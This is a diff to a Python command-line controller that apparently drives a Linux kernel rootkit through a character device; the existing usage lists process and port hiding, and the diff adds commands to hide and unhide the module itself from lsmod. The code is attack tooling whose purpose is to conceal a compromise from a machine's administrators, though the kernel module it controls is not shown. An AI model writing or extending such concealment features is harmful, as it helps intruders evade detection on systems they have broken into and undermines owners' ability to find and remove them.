@@ -15,6 +15,8 @@ def usage():
         "--proc-unhide <pid>        -- Process unhiding by PID.\n" \
         "--port-hide <pid>          -- Port hiding by port number.\n" \
         "--port-unhide <pid>        -- Port unhiding by port number.\n" \
+        "--mod-hide <pid>           -- Module hiding (hide itself from lsmod).\n" \
+        "--mod-unhide <pid>         -- Module unhiding (unhide itself from lsmod).\n" \
         "\n" \
         "-h --help                  -- Help message.\n" \
         "-v --version               -- Version info." \
@@ -79,6 +81,17 @@ if __name__ == '__main__':
         has_n_args_or_die(3)
         with open(cdev, 'w') as f:
             f.write('port_unhide {}'.format(sys.argv[2]))
+
+
+    elif sys.argv[1] in ['--mod-hide']:
+        with open(cdev, 'w') as f:
+            f.write('mod_hide')
+
+
+    elif sys.argv[1] in ['--mod-unhide']:
+        with open(cdev, 'w') as f:
+            f.write('mod_unhide')
+
 
     elif sys.argv[1] in ['-h', '--help']:
         print(usage())
